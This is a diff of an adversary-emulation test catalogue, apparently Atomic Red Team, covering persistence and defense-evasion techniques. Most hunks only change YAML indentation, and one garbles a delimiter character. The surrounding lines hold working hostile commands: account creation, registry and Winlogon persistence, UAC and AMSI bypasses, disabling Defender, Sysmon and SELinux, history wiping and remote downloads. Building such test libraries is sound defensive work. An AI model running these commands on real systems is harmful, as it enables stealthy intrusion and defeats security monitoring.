@@ -62,7 +62,7 @@ persistence:
     - name: Add command to .bash_profile
       description: 'Adds a command to the .bash_profile file of the current user
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -75,11 +75,11 @@ persistence:
         name: sh
         command: 'echo "#{command_to_add}" >> ~/.bash_profile
 
-'
+          '
     - name: Add command to .bashrc
       description: 'Adds a command to the .bashrc file of the current user
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -92,7 +92,7 @@ persistence:
         name: sh
         command: 'echo "#{command_to_add}" >> ~/.bashrc
 
-'
+          '
   T1015:
     technique:
       x_mitre_permissions_required:
@@ -178,7 +178,7 @@ persistence:
           description: 'Comma separated list of system binaries to which you want
             to attach each #{attached_process}. Default: "osk.exe"
 
-'
+            '
           type: String
           default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
             atbroker.exe
@@ -186,7 +186,7 @@ persistence:
           description: 'Full path to process to attach to target in #{parent_list}.
             Default: cmd.exe
 
-'
+            '
           type: Path
           default: C:\windows\system32\cmd.exe
       executor:
@@ -303,7 +303,7 @@ persistence:
     - name: Admin Account Manipulate
       description: 'Manipulate Admin Account Name
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -522,7 +522,7 @@ persistence:
       description: 'AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs
         to be loaded into each user mode process on the system
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -535,7 +535,7 @@ persistence:
         elevation_required: true
         command: 'reg.exe import #{registry_file}
 
-'
+          '
   T1138:
     technique:
       x_mitre_data_sources:
@@ -642,7 +642,7 @@ persistence:
     - name: New shim database files created in the default shim database directory
       description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -657,7 +657,7 @@ persistence:
     - name: Registry key creation and/or modification events for SDB
       description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -772,10 +772,10 @@ persistence:
         command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
 
-'
+          '
         cleanup_command: 'del #{local_file} >nul 2>&1
 
-'
+          '
     - name: Bitsadmin Download (PowerShell)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
@@ -798,10 +798,10 @@ persistence:
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
 
-'
+          '
         cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
-'
+          '
     - name: Persist, Download, & Execute
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
@@ -949,7 +949,7 @@ persistence:
     - name: Firefox
       description: 'Create a file called test.wma, with the duration of 30 seconds
 
-'
+        '
       supported_platforms:
       - linux
       - windows
@@ -1052,10 +1052,10 @@ persistence:
         elevation_required: false
         command: 'assoc #{extension_to_change}=#{target_extension_handler}
 
-'
+          '
         cleanup_command: 'assoc .hta=htafile
 
-'
+          '
   T1136:
     technique:
       x_mitre_permissions_required:
@@ -1128,7 +1128,7 @@ persistence:
     - name: Create a user account on a Linux system
       description: 'Create a user via useradd
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -1141,14 +1141,14 @@ persistence:
         elevation_required: true
         command: 'useradd -M -N -r -s /bin/bash -c evil_account #{username}
 
-'
+          '
         cleanup_command: 'userdel #{username}
 
-'
+          '
     - name: Create a user account on a MacOS system
       description: 'Creates a user on a MacOS system with dscl
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -1172,11 +1172,11 @@ persistence:
           dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
         cleanup_command: 'dscl . -delete /Users/#{username}
 
-'
+          '
     - name: Create a new user in a command prompt
       description: 'Creates a new user in a command prompt
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -1193,14 +1193,14 @@ persistence:
         elevation_required: true
         command: 'net user /add "#{username}" "#{password}"
 
-'
+          '
         cleanup_command: 'net user /del "#{username}"
 
-'
+          '
     - name: Create a new user in PowerShell
       description: 'Creates a new user in PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -1213,15 +1213,15 @@ persistence:
         elevation_required: true
         command: 'New-LocalUser -Name "#{username}" -NoPassword
 
-'
+          '
         cleanup_command: 'Remove-LocalUser -Name "#{username}" -ErrorAction Ignore
 
-'
+          '
     - name: Create a new user in Linux with `root` UID and GID.
       description: 'Creates a new user in Linux and adds the user to the `root` group.
         This technique was used by adversaries during the Butter attack campaign.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -1413,7 +1413,7 @@ persistence:
       description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
         daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -1585,7 +1585,7 @@ persistence:
     - name: Create a hidden file in a hidden directory
       description: 'Creates a hidden file inside a hidden directory
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -1597,11 +1597,11 @@ persistence:
           echo "T1158" > /var/tmp/.hidden-directory/.hidden-file
         cleanup_command: 'rm -rf /var/tmp/.hidden-directory/
 
-'
+          '
     - name: Mac Hidden file
       description: 'Hide a file on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -1610,12 +1610,12 @@ persistence:
         command: 'xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00
           40 00 FF FF FF FF 00 00"
 
-'
+          '
     - name: Create Windows System File with Attrib
       description: 'Creates a file and marks it as a system file using the attrib.exe
         utility.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -1626,11 +1626,11 @@ persistence:
           attrib.exe +s %TEMP%\T1158.txt
         cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
 
-'
+          '
     - name: Create Windows Hidden File with Attrib
       description: 'Creates a file and marks it as hidden using the attrib.exe utility.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -1641,11 +1641,11 @@ persistence:
           attrib.exe +h %TEMP%\T1158_hidden.txt
         cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
 
-'
+          '
     - name: Hidden files
       description: 'Requires Apple Dev Tools
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -1658,11 +1658,11 @@ persistence:
         elevation_required: false
         command: 'setfile -a V #{filename}
 
-'
+          '
     - name: Hide a Directory
       description: 'Hide a directory on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -1673,11 +1673,11 @@ persistence:
           chflags hidden /var/tmp/T1158_mac.txt
         cleanup_command: 'rm /var/tmp/T1158_mac.txt
 
-'
+          '
     - name: Show all hidden files
       description: 'Show all hidden files on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -1685,15 +1685,15 @@ persistence:
         elevation_required: false
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
-'
+          '
         cleanup_command: 'defaults write com.apple.finder AppleShowAllFiles NO
 
-'
+          '
     - name: Create ADS command prompt
       description: 'Create an Alternate Data Stream with the command prompt. Write
         access is required.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -1711,15 +1711,15 @@ persistence:
         command: |
           echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
-          for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
+          for /f "usebackq delims=╧å" %i in (#{file_name}:#{ads_filename}) do %i
         cleanup_command: 'del #{file_name} >nul 2>&1
 
-'
+          '
     - name: Create ADS PowerShell
       description: 'Create an Alternate Data Stream with PowerShell. Write access
         is required.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -1741,7 +1741,7 @@ persistence:
           ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
         cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
-'
+          '
   T1179:
     technique:
       x_mitre_data_sources:
@@ -1871,7 +1871,7 @@ persistence:
     - name: Hook PowerShell TLS Encrypt/Decrypt Messages
       description: 'Hooks functions in PowerShell to read TLS Communications
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -2071,7 +2071,7 @@ persistence:
     - name: IFEO Add Debugger
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -2089,15 +2089,15 @@ persistence:
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
-'
+          '
         cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /f
 
-'
+          '
     - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -2225,7 +2225,7 @@ persistence:
       description: 'This test uses the insmod command to load a kernel module for
         Linux.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -2242,10 +2242,10 @@ persistence:
         elevation_required: true
         command: 'insmod #{kernel_module_file}
 
-'
+          '
         cleanup_command: 'rmmod #{module_name}
 
-'
+          '
   T1159:
     technique:
       x_mitre_permissions_required:
@@ -2330,7 +2330,7 @@ persistence:
     - name: Launch Agent
       description: 'Create a plist and execute it
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -2432,7 +2432,7 @@ persistence:
     - name: Launch Daemon
       description: 'Utilize LaunchDaemon to launch `Hello World`
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -2516,14 +2516,14 @@ persistence:
     - name: Launchctl
       description: 'Utilize launchctl
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
 
-'
+          '
   T1168:
     technique:
       x_mitre_data_sources:
@@ -2611,7 +2611,7 @@ persistence:
         of the referenced file. This technique was used by numerous IoT automated
         exploitation attacks.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -2628,13 +2628,13 @@ persistence:
         name: bash
         command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
-'
+          '
     - name: Cron - Add script to cron folder
       description: 'This test adds a script to a cron folder configured to execute
         on a schedule. This technique was used by the threat actor Rocke during the
         exploitation of Linux web servers.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -2651,7 +2651,7 @@ persistence:
         name: bash
         command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
 
-'
+          '
     - name: Event Monitor Daemon Persistence
       description: "This test adds persistence via a plist to execute via the macOS
         Event Monitor Daemon. \n"
@@ -2756,7 +2756,7 @@ persistence:
       description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
         directory.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -2781,7 +2781,7 @@ persistence:
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -2796,7 +2796,7 @@ persistence:
     - name: Logon Scripts - Mac
       description: 'Mac logon script
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -2812,7 +2812,7 @@ persistence:
       description: 'vbs files can be placed in and ran from the startup folder to
         maintain persistance
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -3005,7 +3005,7 @@ persistence:
       description: 'Netsh interacts with other operating system components using dynamic-link
         library (DLL) files
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -3017,7 +3017,7 @@ persistence:
         name: command_prompt
         command: 'netsh.exe add helper #{helper_file}
 
-'
+          '
   T1050:
     technique:
       x_mitre_permissions_required:
@@ -3430,7 +3430,7 @@ persistence:
     - name: Plist Modification
       description: 'Modify MacOS plist file in one of two directories
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -3523,7 +3523,7 @@ persistence:
       description: 'Appends a start process cmdlet to the current user''s powershell
         profile pofile that points to a malicious executable
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -3604,7 +3604,7 @@ persistence:
         command: 'echo osascript -e ''tell app "Finder" to display dialog "Hello World"''
           >> /etc/rc.common
 
-'
+          '
   T1164:
     technique:
       x_mitre_permissions_required:
@@ -3786,11 +3786,11 @@ persistence:
         command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V
           "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
 
-'
+          '
         cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           /V "Atomic Red Team" /f
 
-'
+          '
     - name: Reg Key RunOnce
       description: "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe
         will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will
@@ -3807,11 +3807,11 @@ persistence:
         command: 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
           /v 1 /d "#{thing_to_execute}"
 
-'
+          '
         cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
           /v 1 /f
 
-'
+          '
     - name: PowerShell Registry RunOnce
       description: |
         RunOnce Key Persistence via PowerShell
@@ -3836,7 +3836,7 @@ persistence:
         cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
           -Force -ErrorAction Ignore
 
-'
+          '
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -3941,7 +3941,7 @@ persistence:
         elevation_required: false
         command: 'at 13:20 /interactive cmd
 
-'
+          '
     - name: Scheduled task Local
       description: "Upon successful execution, cmd.exe will create a scheduled task
         to spawn cmd.exe at 20:10. \n"
@@ -3961,10 +3961,10 @@ persistence:
         elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
-'
+          '
     - name: Scheduled task Remote
       description: "Create a task on a remote system.\n\nUpon successful execution,
         cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote
@@ -3998,10 +3998,10 @@ persistence:
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
 
-'
+          '
     - name: Powershell Cmdlet Scheduled Task
       description: "Create an atomic scheduled task that leverages native powershell
         cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled
@@ -4021,7 +4021,7 @@ persistence:
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
           >$null 2>&1
 
-'
+          '
   T1180:
     technique:
       x_mitre_data_sources:
@@ -4084,7 +4084,7 @@ persistence:
         sets it as the screensaver so it will execute for persistence. Requires a
         reboot and logon.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -4425,7 +4425,7 @@ persistence:
       description: 'Make, change owner, and change file attributes on a C source code
         file
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -4451,7 +4451,7 @@ persistence:
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -4469,11 +4469,11 @@ persistence:
           sudo chmod u+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-'
+          '
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -4491,7 +4491,7 @@ persistence:
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-'
+          '
   T1023:
     technique:
       x_mitre_permissions_required:
@@ -4557,11 +4557,11 @@ persistence:
         command: 'echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe
           >> #{shortcut_file_path} && #{shortcut_file_path} >nul 2>&1
 
-'
+          '
     - name: Create shortcut to cmd in startup folders
       description: 'LNK file to launch CMD placed in startup folder
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -4657,10 +4657,10 @@ persistence:
         elevation_required: true
         command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
-'
+          '
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
-'
+          '
   T1501:
     technique:
       x_mitre_data_sources:
@@ -4759,7 +4759,7 @@ persistence:
       description: 'This test creates a Systemd service unit file and enables it as
         a service.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -4975,10 +4975,10 @@ persistence:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
 
-'
+          '
         cleanup_command: 'del #{web_shell_path} >nul 2>&1
 
-'
+          '
   T1084:
     technique:
       x_mitre_permissions_required:
@@ -5161,11 +5161,11 @@ persistence:
         command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
           "Shell" "explorer.exe, #{binary_to_execute}" -Force
 
-'
+          '
         cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
           NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
 
-'
+          '
     - name: Winlogon Userinit Key Persistence - PowerShell
       description: |
         PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.
@@ -5184,11 +5184,11 @@ persistence:
         command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
           "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
 
-'
+          '
         cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
           NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
 
-'
+          '
     - name: Winlogon Notify Key Logon Persistence - PowerShell
       description: |
         PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.
@@ -5210,7 +5210,7 @@ persistence:
         cleanup_command: 'Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
           -Force -ErrorAction Ignore
 
-'
+          '
 defense-evasion:
   '':
     technique:
@@ -5373,10 +5373,10 @@ defense-evasion:
         command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
 
-'
+          '
         cleanup_command: 'del #{local_file} >nul 2>&1
 
-'
+          '
     - name: Bitsadmin Download (PowerShell)
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to download
@@ -5399,10 +5399,10 @@ defense-evasion:
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
 
-'
+          '
         cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
-'
+          '
     - name: Persist, Download, & Execute
       description: |
         This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
@@ -5513,7 +5513,7 @@ defense-evasion:
         elevation_required: false
         command: 'dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}
 
-'
+          '
   T1088:
     technique:
       x_mitre_data_sources:
@@ -5629,7 +5629,7 @@ defense-evasion:
           cmd.exe /c eventvwr.msc
         cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
 
-'
+          '
     - name: Bypass UAC using Event Viewer (PowerShell)
       description: |
         PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -5650,12 +5650,12 @@ defense-evasion:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
           -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -5672,12 +5672,12 @@ defense-evasion:
           fodhelper.exe
         cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
 
-'
+          '
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -5696,7 +5696,7 @@ defense-evasion:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
           -Recurse -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC using ComputerDefaults (PowerShell)
       description: |
         PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
@@ -5719,7 +5719,7 @@ defense-evasion:
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
           -Recurse -ErrorAction Ignore
 
-'
+          '
     - name: Bypass UAC by Mocking Trusted Directories
       description: |
         Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
@@ -5820,7 +5820,7 @@ defense-evasion:
       description: 'Adversaries may supply CMSTP.exe with INF files infected with
         malicious commands
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -5840,12 +5840,12 @@ defense-evasion:
         elevation_required: false
         command: 'cmstp.exe /s #{inf_file_path}
 
-'
+          '
     - name: CMSTP Executing UAC Bypass
       description: 'Adversaries may invoke cmd.exe (or other malicious commands) by
         embedding them in the RunPreSetupCommandsSection of an INF file
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -5865,7 +5865,7 @@ defense-evasion:
         elevation_required: false
         command: 'cmstp.exe /s #{inf_file_uac} /au
 
-'
+          '
   T1146:
     technique:
       x_mitre_data_sources:
@@ -5918,7 +5918,7 @@ defense-evasion:
     - name: Clear Bash history (rm)
       description: 'Clears bash history via rm
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -5926,11 +5926,11 @@ defense-evasion:
         name: sh
         command: 'rm ~/.bash_history
 
-'
+          '
     - name: Clear Bash history (echo)
       description: 'Clears bash history via rm
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -5938,11 +5938,11 @@ defense-evasion:
         name: sh
         command: 'echo "" > ~/.bash_history
 
-'
+          '
     - name: Clear Bash history (cat dev/null)
       description: 'Clears bash history via cat /dev/null
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -5950,11 +5950,11 @@ defense-evasion:
         name: sh
         command: 'cat /dev/null > ~/.bash_history
 
-'
+          '
     - name: Clear Bash history (ln dev/null)
       description: 'Clears bash history via a symlink to /dev/null
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -5962,23 +5962,23 @@ defense-evasion:
         name: sh
         command: 'ln -sf /dev/null ~/.bash_history
 
-'
+          '
     - name: Clear Bash history (truncate)
       description: 'Clears bash history via truncate
 
-'
+        '
       supported_platforms:
       - linux
       executor:
         name: sh
         command: 'truncate -s0 ~/.bash_history
 
-'
+          '
     - name: Clear history of a bunch of shells
       description: 'Clears the history of a bunch of different shell types by setting
         the history size to zero
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -6078,10 +6078,10 @@ defense-evasion:
         command: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file}
           #{input_file}
 
-'
+          '
         cleanup_command: 'del #{output_file} >nul 2>&1
 
-'
+          '
   T1223:
     technique:
       x_mitre_data_sources:
@@ -6169,7 +6169,7 @@ defense-evasion:
         elevation_required: false
         command: 'hh.exe #{local_chm_file}
 
-'
+          '
     - name: Compiled HTML Help Remote Payload
       description: |
         Uses hh.exe to execute a remote compiled HTML Help payload.
@@ -6186,7 +6186,7 @@ defense-evasion:
         elevation_required: false
         command: 'hh.exe #{remote_chm_file}
 
-'
+          '
   T1090:
     technique:
       x_mitre_data_sources:
@@ -6264,7 +6264,7 @@ defense-evasion:
         name: sh
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
-'
+          '
         cleanup_command: |
           unset http_proxy
           unset https_proxy
@@ -6394,7 +6394,7 @@ defense-evasion:
         elevation_required: false
         command: 'control.exe #{cpl_file_path}
 
-'
+          '
   T1207:
     technique:
       x_mitre_data_sources:
@@ -6652,7 +6652,7 @@ defense-evasion:
         updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl
         dll to be loaded
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -6750,7 +6750,7 @@ defense-evasion:
       description: 'Rename certutil and decode a file. This is in reference to latest
         research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -6821,7 +6821,7 @@ defense-evasion:
     - name: Disable iptables firewall
       description: 'Disables the iptables firewall
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -6840,7 +6840,7 @@ defense-evasion:
     - name: Disable syslog
       description: 'Disables syslog collection
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -6857,7 +6857,7 @@ defense-evasion:
     - name: Disable Cb Response
       description: 'Disable the Cb Response service
 
-'
+        '
       supported_platforms:
       - linux
       executor:
@@ -6874,52 +6874,52 @@ defense-evasion:
     - name: Disable SELinux
       description: 'Disables SELinux enforcement
 
-'
+        '
       supported_platforms:
       - linux
       executor:
         name: sh
         command: 'setenforce 0
 
-'
+          '
     - name: Disable Carbon Black Response
       description: 'Disables Carbon Black Response
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
 
-'
+          '
     - name: Disable LittleSnitch
       description: 'Disables LittleSnitch
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
-'
+          '
     - name: Disable OpenDNS Umbrella
       description: 'Disables OpenDNS Umbrella
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
-'
+          '
     - name: Unload Sysmon Filter Driver
       description: 'Unloads the Sysinternals Sysmon filter driver without stopping
         the Sysmon service.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -6938,10 +6938,10 @@ defense-evasion:
         elevation_required: true
         prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}
 
-'
+          '
         command: 'fltmc.exe unload #{sysmon_driver}
 
-'
+          '
         cleanup_command: |
           sc stop sysmon
           fltmc.exe load #{sysmon_driver}
@@ -6962,19 +6962,19 @@ defense-evasion:
         prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {exit
           0} else {exit 1}
 
-'
+          '
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
           /section:httplogging /dontLog:true
 
-'
+          '
         cleanup_command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
           /section:httplogging /dontLog:false
 
-'
+          '
     - name: Uninstall Sysmon
       description: 'Uninstall Sysinternals Sysmon for Defense Evasion
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7001,10 +7001,10 @@ defense-evasion:
         elevation_required: true
         command: 'sysmon -u
 
-'
+          '
         cleanup_command: 'sysmon -i -accepteula
 
-'
+          '
     - name: AMSI Bypass - AMSI InitFailed
       description: |
         Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
@@ -7028,16 +7028,16 @@ defense-evasion:
         command: 'Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
           -Recurse
 
-'
+          '
         cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
           -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
 
-'
+          '
     - name: Disable Arbitrary Security Windows Service
       description: 'With administrative rights, an adversary can disable Windows Services
         related to security products.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7086,12 +7086,12 @@ defense-evasion:
         elevation_required: false
         command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
 
-'
+          '
     - name: Tamper with Windows Defender ATP PowerShell
       description: 'Attempting to disable scheduled scanning and other parts of windows
         defender atp
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7111,7 +7111,7 @@ defense-evasion:
       description: 'Attempting to disable scheduled scanning and other parts of windows
         defender atp
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7127,7 +7127,7 @@ defense-evasion:
     - name: Tamper with Windows Defender Registry
       description: 'Disable Windows Defender from starting after a reboot
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7136,11 +7136,11 @@ defense-evasion:
         command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
           -Name DisableAntiSpyware -Value 1
 
-'
+          '
         cleanup_command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
           Defender" -Name DisableAntiSpyware -Value 0
 
-'
+          '
     - name: Disable Microft Office Security Features
       description: |
         Gorgon group may disable Office security features so that their code can run
@@ -7174,7 +7174,7 @@ defense-evasion:
         command: '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions
           -All
 
-'
+          '
   T1107:
     technique:
       x_mitre_data_sources:
@@ -7230,7 +7230,7 @@ defense-evasion:
